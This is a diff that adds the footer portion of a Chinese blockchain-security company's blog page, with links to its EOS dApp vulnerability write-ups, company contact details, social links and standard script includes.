+	  <img src="https://blog.noneage.com/EOS-dApp-%E6%BC%8F%E6%B4%9E%E7%9B%98%E7%82%B9-EOSDice%E5%BC%B1%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E1/thub.jpg" class="img-responsive ">
+	</div>
+	<div class="col-md-8">
+	  <h3><a href="https://blog.noneage.com/EOS-dApp-漏洞盘点-EOSDice弱随机数漏洞1/">EOS dApp 漏洞盘点-EOSDice弱随机数漏洞1</a></h3>
+	</div>                        
+      </div>
+    
+  
+    
+      <div class="row margin-bottom-10">
+	<div class="col-md-4">
+	  <img src="https://blog.noneage.com/EOS-dApp-%E6%BC%8F%E6%B4%9E%E7%9B%98%E7%82%B9%E5%88%86%E6%9E%90-EOSBet-%E5%81%87%E5%85%85%E5%80%BC%E6%BC%8F%E6%B4%9E1/asset/eosbet.jpg" class="img-responsive ">
+	</div>
+	<div class="col-md-8">
+	  <h3><a href="https://blog.noneage.com/EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞2/">EOS dApp 漏洞盘点分析-EOSBet 假充值漏洞2</a></h3>
+	</div>                        
+      </div>
+    
+  
+    
+      <div class="row margin-bottom-10">
+	<div class="col-md-4">
+	  <img src="https://blog.noneage.com/EOS-dApp-%E6%BC%8F%E6%B4%9E%E7%9B%98%E7%82%B9-EOSDice%E5%BC%B1%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E1/thub.jpg" class="img-responsive ">
+	</div>
+	<div class="col-md-8">
+	  <h3><a href="https://blog.noneage.com/EOS-dApp-漏洞盘点-EOSDice弱随机数漏洞2/">EOS dApp 漏洞盘点-EOSDice弱随机数漏洞2</a></h3>
+	</div>                        
+      </div>
+    
+  
+</div>
+<!-- END FEATURED POSTS -->                            
+
+</div>
+</div>
+
+  </section>
+</div>
+
+    <!-- BEGIN PRE-FOOTER -->
+    <div class="pre-footer">
+      <div class="container">
+        <div class="row">
+          <!-- BEGIN BOTTOM ABOUT BLOCK -->
+          <div class="col-md-4 col-sm-6 pre-footer-col">
+            <h2>About Us</h2>
+            <p>深圳零时科技有限公司，专注于区块链安全领域。 <br><br> 公司团队由从事安全技术研究和安全服务多年且经验丰富的高级网络安全专家组成，为客户提供专业的安全服务和安全解决方案。</p>
+          </div>
+          <!-- END BOTTOM ABOUT BLOCK -->
+
+          <!-- BEGIN BOTTOM CONTACTS -->
+          <div class="col-md-4 col-sm-6 pre-footer-col">
+            <h2>Contact</h2>
+            <address class="margin-bottom-40">
+              深圳市深南大道佳嘉豪商务大厦18A<br>
+              西安市丈八一路汇鑫国际IBC-A座906<br>
+              <br>
+              Phone: 150-2922-9543<br>
+              Email: <a href="mailto:support@noneage.com">support@noneage.com</a><br>
+            </address>
+          </div>
+          <!-- END BOTTOM CONTACTS -->
+
+	
+          <!-- BEGIN TWITTER BLOCK --> 
+	  <div class="col-md-2 col-sm-6 pre-footer-col">
+                <img src="/metronic/assets/corporate/img/wechat.png" width="160px" hight="160px">
+		<br>
+                <center>微信公账号</center>
+          </div>
+          <div class="col-md-2 col-sm-6 pre-footer-col">
+                <img src="/metronic/assets/corporate/img/zsxq.jpg" width="160px" hight="160px">
+		<br>
+                <center>知识星球</center>
+          </div>
+          <!--div class="col-md-4 col-sm-6 pre-footer-col">
+
+	  <a data-tweet-limit="1" class="twitter-timeline"
+	  href="https://twitter.com/computerlab_"
+	  data-widget-id="678830341331820544">Tweets by @computerlab_</a>
+
+	  <script>!function(d,s,id){var
+	  js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+
+          </div-->
+          <!-- END TWITTER BLOCK -->
+	
+        </div>
+      </div>
+    </div>
+    <!-- END PRE-FOOTER -->
+
+    <!-- BEGIN FOOTER -->
+    <div class="footer">
+      <div class="container">
+        <div class="row">
+          <!-- BEGIN COPYRIGHT -->
+          <div class="col-md-6 col-sm-6 padding-top-10">
+                  &copy; 2020 零时科技<br>
+ <a href="javascript:;">Privacy Policy</a> | <a href="javascript:;">Terms of Service</a>
+          </div>
+          <!-- END COPYRIGHT -->
+	  <!-- BEGIN SOCIAL -->
+<div class="col-md-6 col-sm-6">
+  <ul class="social-footer list-unstyled list-inline pull-right">
+    
+      <li><a href="https://github.com/noneage"><i class="fa fa-github"></i></a></li>
+    
+      <li><a href="https://twitter.com/NoneAgeOffical"><i class="fa fa-twitter"></i></a></li>
+    
+      <li><a href="/atom.xml"><i class="fa fa-rss"></i></a></li>
+    
+  </ul>  
+</div>
+<!-- END SOCIAL -->
+
+        </div>
+      </div>
+    </div>
+    <!-- END FOOTER -->
+
+  <!-- BEGIN CORE PLUGINS (REQUIRED FOR ALL PAGES) -->
+<!--[if lt IE 9]>
+<script src="/metronic/assets/plugins/respond.min.js"></script>
+<![endif]--> 
+<script src="/metronic/assets/plugins/jquery.min.js"></script>
+<script src="/metronic/assets/plugins/jquery-migrate.min.js"></script>
+<script src="/metronic/assets/plugins/bootstrap/js/bootstrap.min.js"></script>
+<script src="/metronic/assets/corporate/scripts/back-to-top.js"></script>
+<script src="/metronic/assets/plugins/owl.carousel/owl.carousel.min.js"></script>
+<script src="/metronic/assets/corporate/scripts/layout.js"></script>
+<script src="/js/wow.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script type="text/javascript">
+    jQuery(document).ready(function() {
+        Layout.init();    
+        Layout.initOWL();
+        Layout.initTwitter();
+        Layout.initFixHeaderWithPreHeader(); /* Switch On Header Fixing (only if you have pre-header) */
+        Layout.initNavScrolling(); 
+	new WOW().init();
+    });
+</script>
+<!-- END CORE PLUGINS -->
+
+<!-- BEGIN PAGE-SPECIFIC PLUGINS --> 
+
+
+
+
+
+
+
+<!-- END PAGE-SPECIFIC PLUGINS --> 
+
+<!-- BEGIN INTEGRATIONS -->
+
+
+
+
+
+<!-- END INTEGRATIONS -->
+
+</body>
+</html>
